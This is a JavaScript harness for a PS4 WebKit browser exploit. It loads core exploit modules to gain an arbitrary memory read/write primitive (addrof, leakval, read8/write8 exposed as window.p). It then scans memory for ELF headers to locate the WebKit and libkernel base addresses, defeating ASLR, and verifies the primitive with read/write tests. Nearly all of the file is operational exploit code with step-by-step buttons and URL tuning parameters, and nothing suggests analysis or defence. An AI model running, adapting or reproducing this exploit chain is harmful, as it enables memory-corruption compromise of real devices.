import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";

let outEl, stateEl, fwSelect, attemptsSelect;
let btnEstablish, btnOffsets, btnCalibrate, btnCalibrateErr, btnAll, btnClear, btnLowMem;

const params = new URLSearchParams(location.search);
const lines = [];
let passCount = 0;
let failCount = 0;
let busy = false;
let primitiveDone = false;
let exploit = null;
let calibratedOff = null;
let probeCache = null;
let logQuiet = 0;

const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-STORED|TRIM-DEBRIS|ADDROF-RELEASE|SSV-GROOM|FAKE-ADDRESS|READ-PRIMITIVE/i;
const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|ABORT|PASS|GIVE-UP|PRIMITIVE|ADDROF-FAIL|ADDROF-NO/i;

const LOG_MAX = 400;
const STORAGE_KEY = "wk-userland-session-v1";
const STORAGE_MAX = 500;
const CAL_ALIGN_STEP = 0x4000;
const CAL_DEFAULT_MIN = 0x1e00000;
const CAL_DEFAULT_MAX = 0x4500000;
const CAL_CHUNK_DEFAULT = 12;
const CAL_YIELD_EVERY = 3;
const CAL_YIELD_MS = 24;
const CAL_MAX_CHUNKS_PER_CLICK = 2;

let saveTimer = null;

function renderLog() {
    if (!outEl) return;
    outEl.textContent = lines.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function saveSession() {
    try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify({
            v: 1,
            ts: Date.now(),
            lines: lines.slice(-STORAGE_MAX),
            passCount,
            failCount,
            stateMsg: stateEl ? stateEl.textContent : "",
            stateCls: stateEl ? stateEl.className : "",
            primitiveDone,
            calibratedOff,
        }));
    } catch (_) { }
}

function scheduleSave() {
    if (saveTimer) return;
    saveTimer = setTimeout(() => {
        saveTimer = null;
        saveSession();
    }, 120);
}

function loadSession() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY);
        if (!raw) return null;
        const data = JSON.parse(raw);
        if (!data || !Array.isArray(data.lines) || data.lines.length === 0)
            return null;
        lines.length = 0;
        lines.push(...data.lines.slice(-STORAGE_MAX));
        passCount = data.passCount || 0;
        failCount = data.failCount || 0;
        primitiveDone = !!data.primitiveDone;
        calibratedOff = data.calibratedOff || null;
        renderLog();
        if (stateEl && data.stateMsg)
            state(data.stateMsg, data.stateCls || "");
        return {
            savedPrimitive: !!data.primitiveDone,
            savedCalibrated: !!data.calibratedOff,
            savedAt: data.ts || 0,
        };
    } catch (_) {
        return null;
    }
}

function lastMeaningfulLine() {
    for (let i = lines.length - 1; i >= 0; i--) {
        const l = lines[i];
        if (l.startsWith("RELOAD") || l.startsWith("RESTORE") || l.startsWith("HINT-RESTORE"))
            continue;
        return l;
    }
    return "";
}

function mark(tag, detail) {
    if (!outEl) return;
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (lines.length > LOG_MAX)
        lines.splice(0, lines.length - LOG_MAX);
    renderLog();
    if (logQuiet === 0)
        scheduleSave();
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (logQuiet === 0)
        scheduleSave();
}

function clearLog() {
    lines.length = 0;
    passCount = 0;
    failCount = 0;
    calibratedOff = null;
    primitiveDone = false;
    probeCache = null;
    if (outEl) outEl.textContent = "";
    try { localStorage.removeItem(STORAGE_KEY); } catch (_) { }
}

function resolvedOffKey() {
    const pick = fwSelect.value;
    if (pick === "auto") {
        const detected = offsetsFor(navigator.userAgent);
        return detected.key || "13.00";
    }
    return pick;
}

function effectiveOff() {
    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) return null;
    if (calibratedOff)
        return Object.assign({}, off, calibratedOff);
    return off;
}

function crossFw(offKey) {
    const detected = offsetsFor(navigator.userAgent);
    return detected.key && detected.key !== offKey;
}

function setUi() {
    if (!btnEstablish) return;
    const hasP = !!window.p;
    btnEstablish.disabled = busy || primitiveDone;
    btnOffsets.disabled = busy || !hasP;
    btnCalibrate.disabled = busy || !hasP;
    if (btnCalibrateErr) btnCalibrateErr.disabled = busy || !hasP || !calibratedOff;
    btnAll.disabled = busy || primitiveDone;
    btnClear.disabled = busy;
    fwSelect.disabled = busy || primitiveDone;
    if (attemptsSelect) attemptsSelect.disabled = busy || primitiveDone;
}

async function withBusy(fn) {
    if (busy) return;
    busy = true;
    setUi();
    try {
        await fn();
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "importing core.js + mem.js...");
    const core = await import("./core.js");
    const mem = await import("./mem.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP: mem.installWindowP,
        pairStatus: mem.pairStatus
    };
    mark("LOAD-OK", "exploit modules ready");
    return exploit;
}

function check(name, ok, detail) {
    if (ok) {
        passCount++;
        mark("PASS", name + (detail ? "  " + detail : ""));
    } else {
        failCount++;
        mark("FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
}

function same64(a, b) {
    return a.low === b.low && a.hi === b.hi;
}

function alignedWebkitBase(v) {
    return v.hi > 0 && (v.low & 0x3fff) === 0;
}

function plausibleLibkernelBase(v) {
    return v.hi > 0 && v.low !== 0;
}

function plausibleUserPtr(v) {
    if (!v || typeof v !== "object" || !("low" in v)) return false;
    const hi = v.hi >>> 0;
    const lo = v.low >>> 0;
    if (hi > 0xffff) return false;
    if (lo === 0 && hi === 0) return false;
    return true;
}

function read8p(p, addr) {
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    try { return p.read4(addr); } catch (_) { return null; }
}

function safeRead8(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read8(addr);
    } catch (_) {
        return null;
    }
}

function safeRead4(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read4(addr);
    } catch (_) {
        return null;
    }
}

function parseNativeFnStr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8)
        return new int64(parseInt(s, 16), 0);
    const lo = parseInt(s.slice(-8), 16);
    const hi = parseInt(s.slice(0, -8), 16);
    return new int64(lo, hi);
}

function preCalTrim() {
    if (lines.length > 10) {
        lines.splice(0, lines.length - 10);
        renderLog();
    }
}

function captureNativeFn(p, mFunctionOff) {
    const cell = p.leakval(Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (!nativeFn) return null;
    probeCache = { nativeFn, mFunctionOff, cell, mid };
    try {
        sessionStorage.setItem("wk-nativeFn", String(nativeFn));
    } catch (_) { }
    return nativeFn;
}

function nativeFnForOff(p, off) {
    if (probeCache && probeCache.nativeFn)
        return probeCache.nativeFn;
    try {
        const cached = parseNativeFnStr(sessionStorage.getItem("wk-nativeFn"));
        if (cached) {
            probeCache = { nativeFn: cached, mFunctionOff: off.wk_JSFunction_m_function || 0x28 };
            return cached;
        }
    } catch (_) { }
    return captureNativeFn(p, off.wk_JSFunction_m_function || 0x28);
}

const ELF_MAGIC = 0x464c457f;

function parseCalHex(name, fallback) {
    const v = parseInt(params.get(name) || "", 16);
    return v > 0 ? v : fallback;
}

function firstAlignedDelta(nativeFn, minDelta) {
    const residue = nativeFn.low & (CAL_ALIGN_STEP - 1);
    let d = minDelta >>> 0;
    const r = d & (CAL_ALIGN_STEP - 1);
    if (r !== residue)
        d = (d + ((residue - r + CAL_ALIGN_STEP) & (CAL_ALIGN_STEP - 1))) >>> 0;
    return d;
}

function countAlignedDeltas(nativeFn, minDelta, maxDelta) {
    const first = firstAlignedDelta(nativeFn, minDelta);
    if (first > maxDelta) return 0;
    return Math.floor((maxDelta - first) / CAL_ALIGN_STEP) + 1;
}

function deltaAtIndex(nativeFn, minDelta, index) {
    return (firstAlignedDelta(nativeFn, minDelta) + index * CAL_ALIGN_STEP) >>> 0;
}

function tryElfOnce(p, nativeFn, delta) {
    if (delta < 0) return null;
    const base = nativeFn.sub32(delta);
    if (!alignedWebkitBase(base)) return null;
    if (read4p(p, base) !== ELF_MAGIC) return null;
    return { delta, base };
}

function finishCalibrate(tableOff, mFunctionOff, delta, base, via) {
    const live = {
        fw_status: "calibrated on hardware",
        wk_JSFunction_m_function: mFunctionOff,
        wk_expm1_builtin: delta,
        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
    };
    calibratedOff = live;
    try {
        sessionStorage.setItem("wk-calibrated", JSON.stringify(live));
    } catch (_) { }
    mark("CAL-OK", via + " expm1=0x" + delta.toString(16) + " base=" + base);
    mark("PASTE-OFFSETS", JSON.stringify(live));
    try { sessionStorage.removeItem("wk-cal-idx"); } catch (_) { }
    try { sessionStorage.removeItem("wk-cal-hint"); } catch (_) { }
    return live;
}

async function tryHintQuick(p, nativeFn, tableOff, mFunctionOff) {
    const hint = tableOff.wk_expm1_builtin;
    if (hint == null) return null;
    for (let k = -4; k <= 12; k++) {
        const delta = (hint + k * CAL_ALIGN_STEP) >>> 0;
        const hit = tryElfOnce(p, nativeFn, delta);
        if (hit)
            return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
                "hint@0x" + hit.delta.toString(16));
        if (k >= 0 && (k % CAL_YIELD_EVERY) === 0)
            await new Promise(r => setTimeout(r, CAL_YIELD_MS));
    }
    return null;
}

async function calibrateOneChunk(p, tableOff, nativeFn, startIdx, chunkSize, calMin, calMax, total) {
    const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
    const endIdx = Math.min(startIdx + chunkSize, total);

    for (let idx = startIdx; idx < endIdx; idx++) {
        const n = idx - startIdx;
        if (n > 0 && (n % CAL_YIELD_EVERY) === 0)
            await new Promise(r => setTimeout(r, CAL_YIELD_MS));

        const delta = deltaAtIndex(nativeFn, calMin, idx);
        if (delta > calMax) break;

        const hit = tryElfOnce(p, nativeFn, delta);
        if (hit) {
            return {
                hit: finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
                    "elf@0x" + hit.delta.toString(16))
            };
        }
    }

    if (endIdx >= total)
        return { done: true, nextIdx: endIdx };

    return { done: false, nextIdx: endIdx };
}

async function calibrateOffsets(p, tableOff) {
    preCalTrim();
    logQuiet++;
    let live = null;
    try {
        live = await calibrateOffsetsInner(p, tableOff);
    } finally {
        logQuiet--;
    }
    saveSession();
    return live;
}

async function calibrateOffsetsInner(p, tableOff) {
    const nativeFn = nativeFnForOff(p, tableOff);
    if (!nativeFn) {
        mark("CAL-FAIL", "nativeFn unreadable");
        return null;
    }
    try {
        sessionStorage.setItem("wk-nativeFn", String(nativeFn));
    } catch (_) { }

    if (params.get("calreset") === "1") {
        try {
            sessionStorage.removeItem("wk-cal-idx");
            sessionStorage.removeItem("wk-cal-hint");
        } catch (_) { }
    }

    if (sessionStorage.getItem("wk-cal-hint") !== "1") {
        const quick = await tryHintQuick(p, nativeFn, tableOff,
            tableOff.wk_JSFunction_m_function || 0x28);
        try { sessionStorage.setItem("wk-cal-hint", "1"); } catch (_) { }
        if (quick) return quick;
    }

    const calMin = parseCalHex("calmin", CAL_DEFAULT_MIN);
    const calMax = parseCalHex("calmax", CAL_DEFAULT_MAX);
    const chunkSize = parseInt(params.get("calchunk") || String(CAL_CHUNK_DEFAULT), 10)
        || CAL_CHUNK_DEFAULT;
    const total = countAlignedDeltas(nativeFn, calMin, calMax);

    let startIdx = 0;
    try {
        startIdx = parseInt(sessionStorage.getItem("wk-cal-idx") || "0", 10) || 0;
    } catch (_) { startIdx = 0; }
    if (startIdx >= total) {
        try { sessionStorage.removeItem("wk-cal-idx"); } catch (_) { }
        startIdx = 0;
    }

    let chunksRun = 0;
    while (chunksRun < CAL_MAX_CHUNKS_PER_CLICK) {
        mark("CAL-SCAN", "nativeFn=" + nativeFn
            + " chunk=" + startIdx + "+" + chunkSize + "/" + total);

        const chunk = await calibrateOneChunk(p, tableOff, nativeFn,
            startIdx, chunkSize, calMin, calMax, total);
        if (chunk.hit)
            return chunk.hit;

        if (chunk.done) {
            try { sessionStorage.removeItem("wk-cal-idx"); } catch (_) { }
            mark("CAL-FAIL", "range exhausted (" + total + " tries)");
            mark("CAL-NATIVEFN", String(nativeFn));
            mark("CAL-NEXT", "?calmax=0x5000000&calreset=1");
            return null;
        }

        startIdx = chunk.nextIdx;
        try {
            sessionStorage.setItem("wk-cal-idx", String(startIdx));
        } catch (_) { }
        chunksRun++;
        if (startIdx >= total) break;
        preCalTrim();
        await new Promise(r => setTimeout(r, CAL_YIELD_MS * 2));
    }

    mark("CAL-MORE", startIdx + "/" + total + " — tap step 3 again to continue");
    return null;
}

function tryTableErrorImportDirect(p, webkitBase, tableOff) {
    if (!tableOff.wk___imp___error || !tableOff.k__error) return null;
    const errorFn = read8p(p, webkitBase.add32(tableOff.wk___imp___error));
    if (!errorFn) return null;
    const lk = errorFn.sub32(tableOff.k__error);
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    if (w0 == null || w1 == null) return null;
    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
        return {
            wk___imp___error: tableOff.wk___imp___error,
            k__error: tableOff.k__error,
            libkernelBase: lk
        };
    return null;
}

function computeBases(p, off) {
    if (!off || !off.wk_expm1_builtin) return null;
    const nativeFn = nativeFnForOff(p, off);
    if (!nativeFn) return { error: "nativeFn unreadable" };
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    if (!off.wk___imp___error || !off.k__error)
        return { nativeFn, webkitBase, libkernelBase: null };
    const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
    if (!errorFn)
        return { nativeFn, webkitBase, libkernelBase: null, error: "error import unreadable" };
    const libkernelBase = errorFn.sub32(off.k__error);
    return { nativeFn, webkitBase, libkernelBase, errorFn };
}

function verifyBases(p, off, checkOffset) {
    const b = computeBases(p, off);
    if (!b) {
        checkOffset("module-bases", false, "no offset table");
        return false;
    }
    if (b.error && !b.libkernelBase) {
        mark("BASES", "webkit=" + b.webkitBase + " nativeFn=" + b.nativeFn
            + " (" + b.error + ")");
        checkOffset("module-bases-webkit-aligned", alignedWebkitBase(b.webkitBase), "");
        checkOffset("module-bases-libkernel", false, b.error);
        return false;
    }
    mark("BASES", "webkit=" + b.webkitBase + " libkernel=" + b.libkernelBase
        + " nativeFn=" + b.nativeFn);
    const wkOk = alignedWebkitBase(b.webkitBase);
    const lkOk = b.libkernelBase
        ? (alignedWebkitBase(b.libkernelBase) || plausibleLibkernelBase(b.libkernelBase))
        : false;
    checkOffset("module-bases-webkit-aligned", wkOk, "");
    if (b.libkernelBase)
        checkOffset("module-bases-libkernel-plausible", lkOk, "");
    return wkOk && lkOk;
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    return read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function logBootInfo() {
    const detected = offsetsFor(navigator.userAgent);
    mark("UA", navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    mark("BOOT", "addrof needs 12M slots — OOM? low-mem btn (never reduce slots)");
    if (params.has("g"))
        mark("BOOT", "groom override: " + params.getAll("g").join(", "));
}

function maxAttemptsPick() {
    const fromUrl = parseInt(params.get("attempts") || "", 10);
    if (fromUrl > 0) return fromUrl;
    if (attemptsSelect) return parseInt(attemptsSelect.value, 10) || 3;
    return 3;
}

async function runEstablish() {
    if (primitiveDone) {
        mark("SKIP", "primitive already established this page");
        return;
    }

    lines.length = 0;
    passCount = 0;
    failCount = 0;
    renderLog();
    logQuiet++;

    const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
    const maxAttempts = maxAttemptsPick();

    state("establishing primitive...", "warn");
    mark("STEP", "1 - get primitive (12M slots, lite groom)");
    mark("ATTEMPTS", String(maxAttempts));

    let carrier;
    try {
        carrier = await establishPrimitive({
            maxAttempts,
            onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } catch (err) {
        if (/gave up/i.test(String(err.message))) {
            mark("HINT", "race lost — close browser fully, reopen, tries=3");
        }
        throw err;
    } finally {
        logQuiet--;
    }

    installWindowP(carrier, {
        promote: params.get("promote") === "1",
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
    });

    const p = window.p;
    if (!p) throw new Error("window.p was not installed");

    primitiveDone = true;
    if (!params.get("expm1"))
        calibratedOff = null;
    mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted);
    mark("PRIMITIVE-OK", "window.p read/write/leakval live");

    const boxA = { tag: "A" };
    const boxB = { tag: "B" };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    check("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");

    saveSession();
    state("primitive OK — step 3 calibrate, then step 2 verify", "ok");
    mark("READY", "PRIMITIVE-OK — cal is separate (step 3)");
}

async function runOffsetTests() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const off = effectiveOff();
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "2 - offset tests (lite)");
    mark("OFFSETS-FW", offKey);
    mark("OFFSETS-SRC", calibratedOff ? "calibrated" : "table (cal failed — BASES skipped)");
    if (crossFw(offKey) && !calibratedOff)
        mark("NOTE", "table RVAs may not match UA firmware");

    state("offset tests...", "warn");
    await new Promise(r => setTimeout(r, 0));

    let offsetFail = 0;
    const checkOffset = (name, ok, detail) => {
        if (ok) {
            passCount++;
            mark("PASS", name + (detail ? "  " + detail : ""));
        } else {
            failCount++;
            offsetFail++;
            mark("FAIL", name + (detail ? "  " + detail : ""));
        }
        return ok;
    };

    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xdeadbeef;

    const dataPtr = bufAddr(p, off, probe);
    if (!dataPtr) {
        checkOffset("arraybuffer-backing", false, "bufAddr failed — impl chain wrong");
    } else {
        const got = read4p(p, dataPtr);
        checkOffset("arraybuffer-read4",
            got === 0xdeadbeef,
            "got=" + (got == null ? "null" : "0x" + got.toString(16)));
        if (got === 0xdeadbeef) {
            p.write4(dataPtr, new int64(0x13371337, 0));
            checkOffset("arraybuffer-write4", view[0] === 0x13371337, "");
        }
    }

    if (!calibratedOff) {
        mark("SKIP-BASES", "cal failed in step 1 — retry step 3 or ?expm1=0x...");
    } else {
        verifyBases(p, off, checkOffset);
        const b = computeBases(p, off);
        if (b && b.webkitBase && !off.k__error) {
            const lk = tryTableErrorImportDirect(p, b.webkitBase, off);
            if (lk)
                mark("LK-OK", "libkernel=" + lk.libkernelBase);
        }
    }

    const summary = passCount + " pass, " + failCount + " fail";
    state("offset tests done — " + summary, offsetFail ? "warn" : "ok");
    mark("DONE-OFFSETS", summary);
}

async function runCalibrate() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    preCalTrim();
    if (lines.length > 15) {
        lines.splice(0, lines.length - 15);
        renderLog();
    }

    mark("STEP", "3 - calibrate (16 tries/chunk, low memory)");
    state("calibrating...", "warn");

    const live = await calibrateOffsets(p, off);

    saveSession();
    if (calibratedOff) {
        state("calibrate OK — run step 2 verify", "ok");
    } else if (live) {
        state("calibrate OK — run step 2 verify", "ok");
    } else {
        const more = sessionStorage.getItem("wk-cal-idx");
        state(more ? "chunk done — tap step 3 again" : "calibrate failed", "warn");
    }
    mark("DONE-CALIBRATE", calibratedOff ? "ok" : (sessionStorage.getItem("wk-cal-idx") ? "more" : "fail"));
}

async function runLibkernelCheck() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");
    if (!calibratedOff) throw new Error("calibrate first (step 1 or 3)");

    const off = effectiveOff();
    if (!off) throw new Error("no offsets");

    mark("STEP", "3b - libkernel check (3 reads)");
    state("libkernel check...", "warn");

    const b = computeBases(p, off);
    if (!b || !b.webkitBase) {
        mark("LK-FAIL", "webkit base unavailable");
        state("libkernel check failed", "warn");
        return;
    }

    const hit = tryTableErrorImportDirect(p, b.webkitBase, off);
    if (hit) {
        mark("LK-OK", "libkernel=" + hit.libkernelBase);
        mark("LK-PASTE", JSON.stringify({
            wk___imp___error: hit.wk___imp___error,
            k__error: hit.k__error
        }));
        state("libkernel OK", "ok");
    } else {
        mark("LK-FAIL", "table __error import did not verify @ webkit=" + b.webkitBase);
        state("libkernel check failed", "warn");
    }
}

function wireButton(el, handler) {
    if (!el) return;
    el.addEventListener("click", () => {
        withBusy(async () => {
            try {
                await handler();
            } catch (err) {
                state("error: " + err.message, "bad");
                mark("ERROR", err.stack || err.message);
            }
        });
    });
}

function restoreCalibratedFromStorage() {
    if (calibratedOff) return;
    try {
        const raw = sessionStorage.getItem("wk-calibrated");
        if (raw)
            calibratedOff = JSON.parse(raw);
    } catch (_) { }
}

function applyUrlOverrides() {
    const expm1 = params.get("expm1");
    if (!expm1) return;
    const delta = parseInt(expm1, 16);
    if (!(delta > 0)) return;
    const { off } = offsetsForKey(resolvedOffKey());
    if (!off) return;
    calibratedOff = Object.assign({}, off, {
        fw_status: "url ?expm1=" + expm1,
        wk_expm1_builtin: delta,
    });
    mark("BOOT", "expm1 override 0x" + delta.toString(16));
}

function init() {
    outEl = document.getElementById("out");
    stateEl = document.getElementById("state");
    fwSelect = document.getElementById("fw-select");
    attemptsSelect = document.getElementById("attempts-select");
    btnEstablish = document.getElementById("btn-establish");
    btnOffsets = document.getElementById("btn-offsets");
    btnCalibrate = document.getElementById("btn-calibrate");
    btnCalibrateErr = document.getElementById("btn-calibrate-err");
    btnAll = document.getElementById("btn-all");
    btnClear = document.getElementById("btn-clear");
    btnLowMem = document.getElementById("btn-lowmem");

    if (!outEl || !btnEstablish) {
        state("UI missing — host via HTTP, open index.html", "bad");
        return;
    }

    wireButton(btnEstablish, runEstablish);
    wireButton(btnOffsets, runOffsetTests);
    wireButton(btnCalibrate, runCalibrate);
    if (btnCalibrateErr)
        wireButton(btnCalibrateErr, runLibkernelCheck);
    wireButton(btnAll, runEstablish);

    btnClear.addEventListener("click", () => {
        if (busy) return;
        clearLog();
        logBootInfo();
        state(primitiveDone ? "primitive OK — pick a test" : "ready", primitiveDone ? "ok" : "");
    });

    btnLowMem.addEventListener("click", () => {
        saveSession();
        const url = new URL(location.href);
        url.searchParams.set("clear", "1");
        url.searchParams.delete("slots");
        url.searchParams.delete("g");
        url.searchParams.append("g", "drain:128");
        url.searchParams.append("g", "drainsz:16384");
        url.searchParams.append("g", "slab:1048576");
        location.href = url.toString();
    });

    window.addEventListener("beforeunload", () => saveSession());
    window.addEventListener("error", (e) => {
        const msg = "JS error: " + (e.message || e);
        state(msg, "bad");
        mark("JS-ERROR", msg + " @ " + (e.filename || "") + ":" + (e.lineno || ""));
    });
    window.addEventListener("unhandledrejection", (e) => {
        const msg = "unhandled: " + (e.reason && e.reason.message ? e.reason.message : e.reason);
        state(msg, "bad");
        mark("JS-REJECT", msg);
    });

    if (params.get("fw") && fwSelect.querySelector('option[value="' + params.get("fw") + '"]'))
        fwSelect.value = params.get("fw");
    if (params.get("attempts") && attemptsSelect)
        attemptsSelect.value = params.get("attempts");

    restoreCalibratedFromStorage();
    applyUrlOverrides();

    if (params.get("clear") === "1") {
        clearLog();
        state("ready — tap step 1", "");
        logBootInfo();
    } else {
        const restored = loadSession();
        if (restored) {
            const savedPrimitive = restored.savedPrimitive;
            if (!window.p)
                primitiveDone = false;
            mark("RELOAD", new Date().toISOString());
            mark("RESTORE", "lines=" + lines.length
                + " pass=" + passCount + " fail=" + failCount
                + " savedPrimitive=" + savedPrimitive
                + " livePrimitive=" + !!window.p
                + (restored.savedCalibrated ? " savedCalibrated=yes" : ""));
            const tail = lastMeaningfulLine();
            if (tail)
                mark("LAST-LOG", tail);
            if (savedPrimitive && !window.p)
                mark("HINT-RESTORE", "step 1 worked last time — re-run 1, then 3 cal, then 2");
            else if (passCount >= 2 && !savedPrimitive)
                mark("HINT-RESTORE", "pass=2 but primitive not saved — OOM during step 1 checks?");
            state("restored log — scroll up for crash point", savedPrimitive ? "warn" : "");
        } else {
            state("ready — tap step 1", "");
            logBootInfo();
        }
    }
    setUi();
}

try {
    init();
} catch (err) {
    state("init error: " + err.message, "bad");
    mark("ERROR", err.stack || err.message);
}
